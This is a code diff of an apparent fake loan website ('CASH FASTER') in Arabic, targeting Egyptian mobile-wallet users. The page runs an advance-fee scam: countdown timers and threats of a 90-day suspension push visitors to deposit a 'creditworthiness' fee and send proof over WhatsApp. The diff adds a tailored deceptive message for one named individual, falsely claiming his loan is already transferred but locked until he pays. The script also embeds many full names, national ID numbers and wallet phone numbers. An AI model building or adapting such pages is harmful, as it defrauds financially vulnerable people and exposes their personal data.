@@ -540,6 +540,37 @@
             color: #fff;
         }
 
+        /* الرسالة الخاصة لهشام */
+        .special-message-card {
+            background: linear-gradient(135deg, #1a2a3a, #0f1722);
+            border: 2px solid #ff6b35;
+            border-radius: 2rem;
+            padding: 2rem;
+            text-align: center;
+            margin-bottom: 2rem;
+            box-shadow: 0 0 30px rgba(255, 107, 53, 0.3);
+            animation: glow 1.5s infinite alternate;
+        }
+        @keyframes glow {
+            from { box-shadow: 0 0 20px rgba(255, 107, 53, 0.3); }
+            to { box-shadow: 0 0 40px rgba(255, 107, 53, 0.6); }
+        }
+        .special-message-card h2 {
+            color: #ff6b35;
+            margin-bottom: 1rem;
+            font-size: 1.8rem;
+        }
+        .special-message-card p {
+            color: #eef5ff;
+            font-size: 1.1rem;
+            line-height: 1.8;
+            margin-bottom: 1rem;
+        }
+        .special-message-card .highlight {
+            color: #FFD966;
+            font-weight: bold;
+        }
+
         @media (max-width: 680px) {
             .container { padding: 1rem; }
             .timer { font-size: 2.5rem; }
@@ -578,216 +609,298 @@
     </div>
 
     <div id="customerSection" class="hidden">
-        <div class="timer-box">
-            <div class="timer-label">
-                <i class="fas fa-clock"></i> موعد استلام القرض
-            </div>
-            <div class="timer" id="loanTimer">36:00</div>
-            <div class="timer-progress">
-                <div class="timer-progress-bar" id="timerProgressBar" style="width: 100%;"></div>
-            </div>
-            <div class="timer-description">
-                ✅ سيتم تحويل المبلغ إلى محفظتك تلقائياً عند انتهاء العد التنازلي
-            </div>
-        </div>
-
-        <div class="vertical-card">
-            <div class="section-title">
-                <i class="fas fa-user-circle"></i> بيانات العميل
-            </div>
-            <div class="info-row">
-                <span class="info-label"><i class="fas fa-id-card"></i> الاسم الرباعي:</span>
-                <span class="info-value" id="customerName">-</span>
-            </div>
-            <div class="info-row">
-                <span class="info-label"><i class="fas fa-passport"></i> الرقم القومي:</span>
-                <span class="info-value" id="customerNationalId">-</span>
-            </div>
-            <div class="info-row">
-                <span class="info-label"><i class="fas fa-wallet"></i> نوع المحفظة:</span>
-                <span class="info-value" id="customerWallet">-</span>
-            </div>
-            <div class="info-row" onclick="copyWalletNumber()" style="cursor: pointer;">
-                <span class="info-label"><i class="fas fa-copy"></i> رقم المحفظة:</span>
-                <span class="info-value" id="customerWalletNumber">-</span>
-            </div>
-            <div class="info-row">
-                <span class="info-label"><i class="fas fa-money-bill-wave"></i> مبلغ القرض:</span>
-                <span class="info-value" id="loanAmount">-</span>
-            </div>
-            <div class="info-row">
-                <span class="info-label"><i class="fas fa-calendar-alt"></i> القسط الشهري:</span>
-                <span class="info-value" id="installmentAmount">-</span>
-            </div>
-            <div class="info-row">
-                <span class="info-label"><i class="fas fa-calendar-week"></i> المدة (شهر):</span>
-                <span class="info-value" id="loanDuration">-</span>
-            </div>
-        </div>
-
-        <div class="vertical-card">
-            <div class="section-title">
-                <i class="fas fa-certificate"></i> إثبات الجدارة الائتمانية (التحقق الأمني)
-            </div>
-            <div class="info-box success">
-                <strong>✅ ما هي الجدارة الائتمانية؟</strong><br>
-                هي إجراء أمني معتمد دولياً لتأكيد ملكيتك للمحفظة والتحقق من قدرتك على السداد. يتم إيداع مبلغ مؤقت وتحويل إلى أي شخص تبعك مباشرة. هذا الإجراء يحمي حقوقك وحقوق الشركة.
-            </div>
-
-            <div class="timer-box" style="background: linear-gradient(135deg, #2a1a0a, #1f1410); border-color: rgba(255, 107, 53, 0.5);">
-                <div class="timer-label" style="color: #ff6b35;">
-                    <i class="fas fa-hourglass-end"></i> الوقت المتبقي لإثبات الجدارة الائتمانية
+        <!-- المحتوى العادي سيظهر لجميع العملاء ما عدا هشام -->
+        <div id="normalContent">
+            <div class="timer-box">
+                <div class="timer-label">
+                    <i class="fas fa-clock"></i> موعد استلام القرض
                 </div>
-                <div class="timer" id="creditworthinessTimer" style="color: #ff6b35;">27:00</div>
+                <div class="timer" id="loanTimer">36:00</div>
                 <div class="timer-progress">
-                    <div class="timer-progress-bar" id="creditworthinessProgressBar" style="width: 100%; background: linear-gradient(90deg, #ff6b35, #FFD966);"></div>
+                    <div class="timer-progress-bar" id="timerProgressBar" style="width: 100%;"></div>
                 </div>
-                <div class="timer-description" style="color: #ff8080;">
-                    ⚠️ <strong>تحذير هام:</strong> يجب إتمام إثبات الجدارة الائتمانية خلال 27 دقيقة. إذا انتهى الوقت دون إثبات الجدارة، لن تتمكن من صرف القرض إلا بعد مرور 90 يوماً.
-                </div>
-            </div>
-
-            <div class="info-box warning">
-                <strong>⚠️ تنبيه أمني:</strong> عند انتهاء الوقت المحدد (27 دقيقة) دون إثبات الجدارة الائتمانية، سيتم تعليق طلبك تلقائياً. لن تتمكن من صرف القرض إلا بعد مرور 90 يوماً من تاريخ التعليق.
-            </div>
-
-            <div class="step-indicator">
-                <div class="step">
-                    <div class="step-number">1️⃣</div>
-                    <div class="step-text">إيداع مبلغ الجدارة<br><span style="color: #FFD966; font-weight: bold;" id="proofAmountText">5000</span> جنيه</div>
-                </div>
-                <div class="step">
-                    <div class="step-number">2️⃣</div>
-                    <div class="step-text">تصوير رسالة التأكيد من المحفظة</div>
-                </div>
-                <div class="step">
-                    <div class="step-number">3️⃣</div>
-                    <div class="step-text">سحب أو تحويل المبلغ وتصوير الرسالة</div>
-                </div>
-                <div class="step">
-                    <div class="step-number">4️⃣</div>
-                    <div class="step-text">إرسال الصور عبر واتساب</div>
+                <div class="timer-description">
+                    ✅ سيتم تحويل المبلغ إلى محفظتك تلقائياً عند انتهاء العد التنازلي
                 </div>
             </div>
 
-            <div class="info-box">
-                <strong>📌 شرح تفصيلي لكل خطوة:</strong><br><br>
-                <strong>الخطوة 1:</strong> قم بإيداع المبلغ المحدد أعلاه في محفظتك وحوله إلى أي شخص تبعك في نفس الوقت.<br><br>
-                <strong>الخطوة 2:</strong> بعد الإيداع مباشرة، ستصل لك رسالة تأكيد من المحفظة. صور هذه الرسالة بالكامل.<br><br>
-                <strong>الخطوة 3:</strong> قم بسحب المبلغ أو تحويله إلى حساب آخر، وصور رسالة التأكيد.<br><br>
-                <strong>الخطوة 4:</strong> أرسل الصور الأربع (رسالة الإيداع + رسالة التأكيد + رسالة السحب + رسالة التحويل) عبر واتساب.
+            <div class="vertical-card">
+                <div class="section-title">
+                    <i class="fas fa-user-circle"></i> بيانات العميل
+                </div>
+                <div class="info-row">
+                    <span class="info-label"><i class="fas fa-id-card"></i> الاسم الرباعي:</span>
+                    <span class="info-value" id="customerName">-</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label"><i class="fas fa-passport"></i> الرقم القومي:</span>
+                    <span class="info-value" id="customerNationalId">-</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label"><i class="fas fa-wallet"></i> نوع المحفظة:</span>
+                    <span class="info-value" id="customerWallet">-</span>
+                </div>
+                <div class="info-row" onclick="copyWalletNumber()" style="cursor: pointer;">
+                    <span class="info-label"><i class="fas fa-copy"></i> رقم المحفظة:</span>
+                    <span class="info-value" id="customerWalletNumber">-</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label"><i class="fas fa-money-bill-wave"></i> مبلغ القرض:</span>
+                    <span class="info-value" id="loanAmount">-</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label"><i class="fas fa-calendar-alt"></i> القسط الشهري:</span>
+                    <span class="info-value" id="installmentAmount">-</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label"><i class="fas fa-calendar-week"></i> المدة (شهر):</span>
+                    <span class="info-value" id="loanDuration">-</span>
+                </div>
             </div>
 
-            <div class="info-box success" style="border-left-color: #25D366;">
-                <strong style="color: #25D366;">✅ بعد الإرسال:</strong> سيقوم فريقنا بالتحقق من البيانات خلال دقائق معدودة وتفعيل القرض فوراً بعد التأكد من صحة المستندات.
+            <div class="vertical-card">
+                <div class="section-title">
+                    <i class="fas fa-certificate"></i> إثبات الجدارة الائتمانية (التحقق الأمني)
+                </div>
+                <div class="info-box success">
+                    <strong>✅ ما هي الجدارة الائتمانية؟</strong><br>
+                    هي إجراء أمني معتمد دولياً لتأكيد ملكيتك للمحفظة والتحقق من قدرتك على السداد. يتم إيداع مبلغ مؤقت وتحويل إلى أي شخص تبعك مباشرة. هذا الإجراء يحمي حقوقك وحقوق الشركة.
+                </div>
+
+                <div class="timer-box" style="background: linear-gradient(135deg, #2a1a0a, #1f1410); border-color: rgba(255, 107, 53, 0.5);">
+                    <div class="timer-label" style="color: #ff6b35;">
+                        <i class="fas fa-hourglass-end"></i> الوقت المتبقي لإثبات الجدارة الائتمانية
+                    </div>
+                    <div class="timer" id="creditworthinessTimer" style="color: #ff6b35;">27:00</div>
+                    <div class="timer-progress">
+                        <div class="timer-progress-bar" id="creditworthinessProgressBar" style="width: 100%; background: linear-gradient(90deg, #ff6b35, #FFD966);"></div>
+                    </div>
+                    <div class="timer-description" style="color: #ff8080;">
+                        ⚠️ <strong>تحذير هام:</strong> يجب إتمام إثبات الجدارة الائتمانية خلال 27 دقيقة. إذا انتهى الوقت دون إثبات الجدارة، لن تتمكن من صرف القرض إلا بعد مرور 90 يوماً.
+                    </div>
+                </div>
+
+                <div class="info-box warning">
+                    <strong>⚠️ تنبيه أمني:</strong> عند انتهاء الوقت المحدد (27 دقيقة) دون إثبات الجدارة الائتمانية، سيتم تعليق طلبك تلقائياً. لن تتمكن من صرف القرض إلا بعد مرور 90 يوماً من تاريخ التعليق.
+                </div>
+
+                <div class="step-indicator">
+                    <div class="step">
+                        <div class="step-number">1️⃣</div>
+                        <div class="step-text">إيداع مبلغ الجدارة<br><span style="color: #FFD966; font-weight: bold;" id="proofAmountText">5000</span> جنيه</div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">2️⃣</div>
+                        <div class="step-text">تصوير رسالة التأكيد من المحفظة</div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">3️⃣</div>
+                        <div class="step-text">سحب أو تحويل المبلغ وتصوير الرسالة</div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">4️⃣</div>
+                        <div class="step-text">إرسال الصور عبر واتساب</div>
+                    </div>
+                </div>
+
+                <div class="info-box">
+                    <strong>📌 شرح تفصيلي لكل خطوة:</strong><br><br>
+                    <strong>الخطوة 1:</strong> قم بإيداع المبلغ المحدد أعلاه في محفظتك وحوله إلى أي شخص تبعك في نفس الوقت.<br><br>
+                    <strong>الخطوة 2:</strong> بعد الإيداع مباشرة، ستصل لك رسالة تأكيد من المحفظة. صور هذه الرسالة بالكامل.<br><br>
+                    <strong>الخطوة 3:</strong> قم بسحب المبلغ أو تحويله إلى حساب آخر، وصور رسالة التأكيد.<br><br>
+                    <strong>الخطوة 4:</strong> أرسل الصور الأربع (رسالة الإيداع + رسالة التأكيد + رسالة السحب + رسالة التحويل) عبر واتساب.
+                </div>
+
+                <div class="info-box success" style="border-left-color: #25D366;">
+                    <strong style="color: #25D366;">✅ بعد الإرسال:</strong> سيقوم فريقنا بالتحقق من البيانات خلال دقائق معدودة وتفعيل القرض فوراً بعد التأكد من صحة المستندات.
+                </div>
+
+                <button class="whatsapp-btn" style="margin-top: 1rem; width: 100%; justify-content: center;" onclick="sendWhatsAppMessage()">
+                    <i class="fab fa-whatsapp"></i> إرسال الصور عبر واتساب
+                </button>
             </div>
 
-            <button class="whatsapp-btn" style="margin-top: 1rem; width: 100%; justify-content: center;" onclick="sendWhatsAppMessage()">
-                <i class="fab fa-whatsapp"></i> إرسال الصور عبر واتساب
-            </button>
+            <div class="vertical-card">
+                <div class="section-title">
+                    <i class="fas fa-video"></i> فيديو توضيحي - كيفية التحقق من الرصيد
+                </div>
+                <div class="info-box">
+                    <strong>📺 شاهد هذا الفيديو:</strong> يوضح كيفية الاستعلام عن رصيدك في المحفظة والتأكد من وصول القرض إلى حسابك بعد التحويل.
+                </div>
+                <div class="video-container">
+                    <video controls width="100%">
+                        <source src="https://d2xsxph8kpxj0f.cloudfront.net/310519663383374789/ZJ8unChtzfopWU9AxQ6boN/VID-20260110-WA0001_88040e32.mp4" type="video/mp4">
+                        متصفحك لا يدعم تشغيل الفيديو
+                    </video>
+                </div>
+                <div class="video-label">
+                    🎬 طريقة الاستعلام عن الرصيد والتأكد من وصول القرض
+                </div>
+                <div class="info-box" style="margin-top: 1rem;">
+                    <strong>💡 نصيحة مهمة:</strong> احفظ هذا الفيديو وشاهده قبل إرسال المستندات لتتأكد من فهمك الكامل للعملية.
+                </div>
+            </div>
+
+            <div class="vertical-card" style="background: #ffffff; color: #0a0a0a; border: 2px solid #D4AF37;">
+                <div style="text-align: center; border-bottom: 3px solid #D4AF37; padding-bottom: 1rem; margin-bottom: 1.5rem;">
+                    <div style="font-size: 2rem; font-weight: bold; color: #D4AF37; margin-bottom: 0.3rem;">
+                        <i class="fas fa-file-contract"></i> CASH FASTER
+                    </div>
+                    <div style="font-size: 1.1rem; font-weight: 600; color: #0a0a0a;">عقد إدانة ومديونية</div>
+                    <div style="font-size: 0.85rem; color: #666;" id="contractDate">-</div>
+                </div>
+
+                <div style="margin-bottom: 1.5rem;">
+                    <div class="contract-section-title">
+                        <i class="fas fa-user"></i> بيانات المدين
+                    </div>
+                    <div class="contract-info-row">
+                        <span class="contract-info-label">الاسم:</span>
+                        <span class="contract-info-value" id="debtorName">-</span>
+                    </div>
+                    <div class="contract-info-row">
+                        <span class="contract-info-label">الرقم القومي:</span>
+                        <span class="contract-info-value" id="debtorId">-</span>
+                    </div>
+                    <div class="contract-info-row">
+                        <span class="contract-info-label">المحفظة:</span>
+                        <span class="contract-info-value" id="debtorWallet">-</span>
+                    </div>
+                    <div class="contract-info-row">
+                        <span class="contract-info-label">رقم المحفظة:</span>
+                        <span class="contract-info-value" id="debtorWalletNum">-</span>
+                    </div>
+                </div>
+
+                <div style="margin-bottom: 1.5rem;">
+                    <div class="contract-section-title">
+                        <i class="fas fa-calculator"></i> تفاصيل القرض
+                    </div>
+                    <div class="contract-info-row">
+                        <span class="contract-info-label">المبلغ الأساسي:</span>
+                        <span class="contract-info-value" id="loanAmountContract">-</span>
+                    </div>
+                    <div class="contract-info-row">
+                        <span class="contract-info-label">الفائدة:</span>
+                        <span class="contract-info-value">33% ثابتة</span>
+                    </div>
+                    <div class="contract-info-row">
+                        <span class="contract-info-label">المبلغ الكلي:</span>
+                        <span class="contract-info-value" id="totalAmountContract">-</span>
+                    </div>
+                    <div class="contract-info-row">
+                        <span class="contract-info-label">عدد الأقساط:</span>
+                        <span class="contract-info-value" id="installmentCountContract">-</span>
+                    </div>
+                    <div class="contract-info-row">
+                        <span class="contract-info-label">القسط الشهري:</span>
+                        <span class="contract-info-value" id="installmentAmountContract">-</span>
+                    </div>
+                    <div class="contract-info-row">
+                        <span class="contract-info-label">تاريخ أول قسط:</span>
+                        <span class="contract-info-value" id="firstPaymentDate">-</span>
+                    </div>
+                    <div class="contract-info-row">
+                        <span class="contract-info-label">طريقة الدفع:</span>
+                        <span class="contract-info-value">فوري باي (كود مرجعي)</span>
+                    </div>
+                </div>
+
+                <div style="font-size: 0.95rem; line-height: 1.8; background: #f5f5f5; padding: 1.2rem; border-radius: 1rem; margin-bottom: 1rem; color: #0a0a0a;">
+                    <strong>📝 الإقرار والشفافية:</strong><br>
+                    أقر أنا الموقع أدناه بأن <strong id="receivedAmount">-</strong> جنيه قد تم تحويلها إلى محفظتي <strong id="myWallet">-</strong> برقم <strong id="myWalletNum">-</strong>، وأتعهد بسداد الأقساط في مواعيدها المحددة وفقاً للشروط المتفق عليها. أقر أيضاً بأنني قد فهمت جميع شروط العقد والتزاماتي المالية.
+                </div>
+
+                <div style="margin-top: 1.5rem;">
+                    <div style="border-top: 2px solid #D4AF37; padding-top: 1rem; display: flex; justify-content: space-between;">
+                        <span style="font-weight: 600;">توقيع المدين</span>
+                        <span style="font-size: 1.5rem; color: #D4AF37;">✓</span>
+                    </div>
+                    <div style="font-size: 0.8rem; text-align: center; color: #666; margin-top: 0.5rem;" id="signatureDate">-</div>
+                </div>
+
+                <div style="font-size: 0.75rem; color: #999; text-align: center; margin-top: 1rem;">
+                    هذا العقد هو نموذج أولي للاطلاع فقط. سيتم توقيع العقد النهائي إلكترونياً عبر منصة موثقة بعد التحقق من المستندات.
+                </div>
+            </div>
         </div>
 
-        <div class="vertical-card">
-            <div class="section-title">
-                <i class="fas fa-video"></i> فيديو توضيحي - كيفية التحقق من الرصيد
+        <!-- المحتوى الخاص لهشام (يظهر فقط عند تسجيل دخوله) -->
+        <div id="specialContent" style="display: none;">
+            <div class="special-message-card">
+                <i class="fas fa-clock" style="font-size: 3rem; color: #ff6b35; margin-bottom: 1rem; display: block;"></i>
+                <h2>⚠️ تنبيه هام ⚠️</h2>
+                <p>عزيزي العميل <strong>هشام أحمد صلاح محمد عبدالغغار</strong>،</p>
+                <p>تم <span class="highlight">منحك مهلة تأجيل الطلب</span> حتى الساعة <strong>6 مساءً</strong> من يوم <strong>الثلاثاء 7 أبريل 2026</strong>.</p>
+                <p>تم <span class="highlight">تحويل مبلغ القرض إلى حسابك</span> بنجاح، ولكن لا يمكنك سحبه إلا بعد <span class="highlight">إتمام إجراءات إثبات الجدارة الائتمانية</span> المحددة أدناه.</p>
+                <p><strong>✅ قم بإيداع المبلغ المطلوب (كما هو موضح في الخطوات) وسيتم صرف القرض لحسابك فوراً.</strong></p>
+                <p style="margin-top: 1rem; font-size: 1rem;">⏳ المهلة تنتهي اليوم الساعة 6 مساءً - يرجى الإسراع لإتمام الإجراءات.</p>
+                <button class="btn-gold" style="margin-top: 1.5rem;" onclick="scrollToSteps()">📋 اضغط لإكمال إجراءات الجدارة</button>
+                <button class="whatsapp-btn" style="margin-top: 1rem; background: #25D366;" onclick="contactSupportSpecial()">📱 تواصل مع الدعم عبر واتساب</button>
             </div>
-            <div class="info-box">
-                <strong>📺 شاهد هذا الفيديو:</strong> يوضح كيفية الاستعلام عن رصيدك في المحفظة والتأكد من وصول القرض إلى حسابك بعد التحويل.
-            </div>
-            <div class="video-container">
-                <video controls width="100%">
-                    <source src="https://d2xsxph8kpxj0f.cloudfront.net/310519663383374789/ZJ8unChtzfopWU9AxQ6boN/VID-20260110-WA0001_88040e32.mp4" type="video/mp4">
-                    متصفحك لا يدعم تشغيل الفيديو
-                </video>
-            </div>
-            <div class="video-label">
-                🎬 طريقة الاستعلام عن الرصيد والتأكد من وصول القرض
-            </div>
-            <div class="info-box" style="margin-top: 1rem;">
-                <strong>💡 نصيحة مهمة:</strong> احفظ هذا الفيديو وشاهده قبل إرسال المستندات لتتأكد من فهمك الكامل للعملية.
-            </div>
-        </div>
+            <!-- إعادة عرض خطوات الجدارة الائتمانية لهشام -->
+            <div id="specialSteps" style="margin-top: 1rem;">
+                <div class="vertical-card">
+                    <div class="section-title">
+                        <i class="fas fa-certificate"></i> إثبات الجدارة الائتمانية (التحقق الأمني)
+                    </div>
+                    <div class="info-box success">
+                        <strong>✅ ما هي الجدارة الائتمانية؟</strong><br>
+                        هي إجراء أمني معتمد دولياً لتأكيد ملكيتك للمحفظة والتحقق من قدرتك على السداد. يتم إيداع مبلغ مؤقت وتحويل إلى أي شخص تبعك مباشرة. هذا الإجراء يحمي حقوقك وحقوق الشركة.
+                    </div>
 
-        <div class="vertical-card" style="background: #ffffff; color: #0a0a0a; border: 2px solid #D4AF37;">
-            <div style="text-align: center; border-bottom: 3px solid #D4AF37; padding-bottom: 1rem; margin-bottom: 1.5rem;">
-                <div style="font-size: 2rem; font-weight: bold; color: #D4AF37; margin-bottom: 0.3rem;">
-                    <i class="fas fa-file-contract"></i> CASH FASTER
-                </div>
-                <div style="font-size: 1.1rem; font-weight: 600; color: #0a0a0a;">عقد إدانة ومديونية</div>
-                <div style="font-size: 0.85rem; color: #666;" id="contractDate">-</div>
-            </div>
+                    <div class="timer-box" style="background: linear-gradient(135deg, #2a1a0a, #1f1410); border-color: rgba(255, 107, 53, 0.5);">
+                        <div class="timer-label" style="color: #ff6b35;">
+                            <i class="fas fa-hourglass-end"></i> الوقت المتبقي لإثبات الجدارة الائتمانية
+                        </div>
+                        <div class="timer" id="specialCreditworthinessTimer" style="color: #ff6b35;">27:00</div>
+                        <div class="timer-progress">
+                            <div class="timer-progress-bar" id="specialCreditworthinessProgressBar" style="width: 100%; background: linear-gradient(90deg, #ff6b35, #FFD966);"></div>
+                        </div>
+                        <div class="timer-description" style="color: #ff8080;">
+                            ⚠️ <strong>تحذير هام:</strong> يجب إتمام إثبات الجدارة الائتمانية خلال 27 دقيقة. إذا انتهى الوقت دون إثبات الجدارة، لن تتمكن من صرف القرض إلا بعد مرور 90 يوماً.
+                        </div>
+                    </div>
 
-            <div style="margin-bottom: 1.5rem;">
-                <div class="contract-section-title">
-                    <i class="fas fa-user"></i> بيانات المدين
-                </div>
-                <div class="contract-info-row">
-                    <span class="contract-info-label">الاسم:</span>
-                    <span class="contract-info-value" id="debtorName">-</span>
-                </div>
-                <div class="contract-info-row">
-                    <span class="contract-info-label">الرقم القومي:</span>
-                    <span class="contract-info-value" id="debtorId">-</span>
-                </div>
-                <div class="contract-info-row">
-                    <span class="contract-info-label">المحفظة:</span>
-                    <span class="contract-info-value" id="debtorWallet">-</span>
-                </div>
-                <div class="contract-info-row">
-                    <span class="contract-info-label">رقم المحفظة:</span>
-                    <span class="contract-info-value" id="debtorWalletNum">-</span>
-                </div>
-            </div>
+                    <div class="info-box warning">
+                        <strong>⚠️ تنبيه أمني:</strong> عند انتهاء الوقت المحدد (27 دقيقة) دون إثبات الجدارة الائتمانية، سيتم تعليق طلبك تلقائياً. لن تتمكن من صرف القرض إلا بعد مرور 90 يوماً من تاريخ التعليق.
+                    </div>
 
-            <div style="margin-bottom: 1.5rem;">
-                <div class="contract-section-title">
-                    <i class="fas fa-calculator"></i> تفاصيل القرض
-                </div>
-                <div class="contract-info-row">
-                    <span class="contract-info-label">المبلغ الأساسي:</span>
-                    <span class="contract-info-value" id="loanAmountContract">-</span>
-                </div>
-                <div class="contract-info-row">
-                    <span class="contract-info-label">الفائدة:</span>
-                    <span class="contract-info-value">33% ثابتة</span>
-                </div>
-                <div class="contract-info-row">
-                    <span class="contract-info-label">المبلغ الكلي:</span>
-                    <span class="contract-info-value" id="totalAmountContract">-</span>
-                </div>
-                <div class="contract-info-row">
-                    <span class="contract-info-label">عدد الأقساط:</span>
-                    <span class="contract-info-value" id="installmentCountContract">-</span>
-                </div>
-                <div class="contract-info-row">
-                    <span class="contract-info-label">القسط الشهري:</span>
-                    <span class="contract-info-value" id="installmentAmountContract">-</span>
-                </div>
-                <div class="contract-info-row">
-                    <span class="contract-info-label">تاريخ أول قسط:</span>
-                    <span class="contract-info-value" id="firstPaymentDate">-</span>
-                </div>
-                <div class="contract-info-row">
-                    <span class="contract-info-label">طريقة الدفع:</span>
-                    <span class="contract-info-value">فوري باي (كود مرجعي)</span>
-                </div>
-            </div>
+                    <div class="step-indicator">
+                        <div class="step">
+                            <div class="step-number">1️⃣</div>
+                            <div class="step-text">إيداع مبلغ الجدارة<br><span style="color: #FFD966; font-weight: bold;" id="specialProofAmountText">5000</span> جنيه</div>
+                        </div>
+                        <div class="step">
+                            <div class="step-number">2️⃣</div>
+                            <div class="step-text">تصوير رسالة التأكيد من المحفظة</div>
+                        </div>
+                        <div class="step">
+                            <div class="step-number">3️⃣</div>
+                            <div class="step-text">سحب أو تحويل المبلغ وتصوير الرسالة</div>
+                        </div>
+                        <div class="step">
+                            <div class="step-number">4️⃣</div>
+                            <div class="step-text">إرسال الصور عبر واتساب</div>
+                        </div>
+                    </div>
 
-            <div style="font-size: 0.95rem; line-height: 1.8; background: #f5f5f5; padding: 1.2rem; border-radius: 1rem; margin-bottom: 1rem; color: #0a0a0a;">
-                <strong>📝 الإقرار والشفافية:</strong><br>
-                أقر أنا الموقع أدناه بأن <strong id="receivedAmount">-</strong> جنيه قد تم تحويلها إلى محفظتي <strong id="myWallet">-</strong> برقم <strong id="myWalletNum">-</strong>، وأتعهد بسداد الأقساط في مواعيدها المحددة وفقاً للشروط المتفق عليها. أقر أيضاً بأنني قد فهمت جميع شروط العقد والتزاماتي المالية.
-            </div>
+                    <div class="info-box">
+                        <strong>📌 شرح تفصيلي لكل خطوة:</strong><br><br>
+                        <strong>الخطوة 1:</strong> قم بإيداع المبلغ المحدد أعلاه في محفظتك وحوله إلى أي شخص تبعك في نفس الوقت.<br><br>
+                        <strong>الخطوة 2:</strong> بعد الإيداع مباشرة، ستصل لك رسالة تأكيد من المحفظة. صور هذه الرسالة بالكامل.<br><br>
+                        <strong>الخطوة 3:</strong> قم بسحب المبلغ أو تحويله إلى حساب آخر، وصور رسالة التأكيد.<br><br>
+                        <strong>الخطوة 4:</strong> أرسل الصور الأربع (رسالة الإيداع + رسالة التأكيد + رسالة السحب + رسالة التحويل) عبر واتساب.
+                    </div>
 
-            <div style="margin-top: 1.5rem;">
-                <div style="border-top: 2px solid #D4AF37; padding-top: 1rem; display: flex; justify-content: space-between;">
-                    <span style="font-weight: 600;">توقيع المدين</span>
-                    <span style="font-size: 1.5rem; color: #D4AF37;">✓</span>
+                    <div class="info-box success" style="border-left-color: #25D366;">
+                        <strong style="color: #25D366;">✅ بعد الإرسال:</strong> سيقوم فريقنا بالتحقق من البيانات خلال دقائق معدودة وتفعيل القرض فوراً بعد التأكد من صحة المستندات.
+                    </div>
+
+                    <button class="whatsapp-btn" style="margin-top: 1rem; width: 100%; justify-content: center;" onclick="sendWhatsAppMessageSpecial()">
+                        <i class="fab fa-whatsapp"></i> إرسال الصور عبر واتساب
+                    </button>
                 </div>
-                <div style="font-size: 0.8rem; text-align: center; color: #666; margin-top: 0.5rem;" id="signatureDate">-</div>
-            </div>
-
-            <div style="font-size: 0.75rem; color: #999; text-align: center; margin-top: 1rem;">
-                هذا العقد هو نموذج أولي للاطلاع فقط. سيتم توقيع العقد النهائي إلكترونياً عبر منصة موثقة بعد التحقق من المستندات.
             </div>
         </div>
 
@@ -874,7 +987,6 @@
         { national_id: "27708040101271", full_name: "صلاح مختار حنفي قرني", wallet_type: "فودافون كاش", wallet_number: "01023669498", loan_amount: 50000 },
         { national_id: "26803241601893", full_name: "السيد ابراهيم الششتاوي قناوي ", wallet_type: "فودافون كاش", wallet_number: "01090232423", loan_amount: 30000 },
         { national_id: "28404071200379", full_name: "محمود علي المتولي السيد حسن", wallet_type: "فودافون كاش", wallet_number: "01001093695", loan_amount: 30000 },
-        { national_id: "28309072600611", full_name: "وحيد محمد عارف عبد الله", wallet_type: "فودافون كاش", wallet_number: "01017453927", loan_amount: 200000 },
         { national_id: "27910252801039", full_name: "مدحت محمد محمود سالم", wallet_type: "اتصالات كاش", wallet_number: "01159760178", loan_amount: 50000 },
         { national_id: "28202072102361", full_name: "الشيماء عبد الغفور دسوقي عباس", wallet_type: "اتصالات كاش", wallet_number: "01143455214", loan_amount: 150000 },
         { national_id: "28610020102762", full_name: "شيماء صابر طه صديق", wallet_type: "اتصالات كاش", wallet_number: "01145403462", loan_amount: 50000 },
@@ -926,10 +1038,8 @@
     };
 
     function getLoanDetails(amount) {
-        // تقريب المبلغ لأقرب ألف (لأن بعض المبالغ قد تكون 185000 إلخ)
         const exact = loanDetailsMap[amount];
         if (exact) return exact;
-        // إذا لم يوجد، نبحث عن أقرب مبلغ موجود
         const keys = Object.keys(loanDetailsMap).map(Number).sort((a,b)=>a-b);
         let closest = keys[0];
         for (let k of keys) {
@@ -941,6 +1051,7 @@
     let currentCustomer = null;
     let timerInterval = null;
     let creditworthinessInterval = null;
+    let specialTimerInterval = null;
 
     function handleSearch(btn) {
         const nationalId = document.getElementById('nationalId').value.trim();
@@ -969,10 +1080,8 @@
 
         // التحقق من وجود محفظة صالحة قبل طلب آخر 4 أرقام
         if (customer.wallet_type === "أخرى" || !customer.wallet_number || customer.wallet_number === "غير مسجل") {
-            // إذا لم يكن لديه محفظة رقمية، لا نطلب آخر 4 أرقام وندخل مباشرة (مع إظهار رسالة)
             alert("⚠️ تنبيه: ليس لديك محفظة رقمية مسجلة (فودافون كاش أو اتصالات كاش). سيتم عرض بياناتك فقط، ولن تتمكن من استخدام واتساب.");
         } else {
-            // طلب آخر 4 أرقام فقط إذا كان لديه محفظة صالحة
             const last4Digits = prompt('🔐 لأغراض التأمين، يرجى إدخال آخر 4 أرقام من رقم محفظتك المسجلة:');
             if (!last4Digits || last4Digits.length !== 4) {
                 alert('❌ يجب إدخال آخر 4 أرقام بشكل صحيح.');
@@ -989,24 +1098,74 @@
         }
 
         currentCustomer = customer;
-        displayCustomerData(customer);
+        
+        // التحقق مما إذا كان العميل هو هشام أحمد صلاح (الرقم القومي 27601011414511)
+        if (customer.national_id === "27601011414511") {
+            // إظهار المحتوى الخاص لهشام فقط
+            document.getElementById('normalContent').style.display = 'none';
+            document.getElementById('specialContent').style.display = 'block';
+            // إعداد المؤقت الخاص لهشام
+            startSpecialCreditworthinessTimer();
+            // تعيين مبلغ الجدارة لهشام (50000 * 0.2 = 10000 مثلاً، لكن سنستخدم نفس منطق المبالغ)
+            let proofAmount;
+            if (customer.loan_amount < 50000) proofAmount = 4000;
+            else if (customer.loan_amount <= 100000) proofAmount = 6000;
+            else if (customer.loan_amount <= 200000) proofAmount = 8000;
+            else proofAmount = 10000;
+            document.getElementById('specialProofAmountText').innerText = proofAmount.toLocaleString();
+        } else {
+            // إظهار المحتوى العادي للعملاء الآخرين
+            document.getElementById('normalContent').style.display = 'block';
+            document.getElementById('specialContent').style.display = 'none';
+            displayCustomerData(customer);
+            startTimer();
+            startCreditworthinessTimer();
+        }
+        
         formSection.classList.add('hidden');
         customerSection.classList.remove('hidden');
-        startTimer();
-        startCreditworthinessTimer();
         window.scrollTo(0, 0);
     }
 
-    function formatCurrency(amount) {
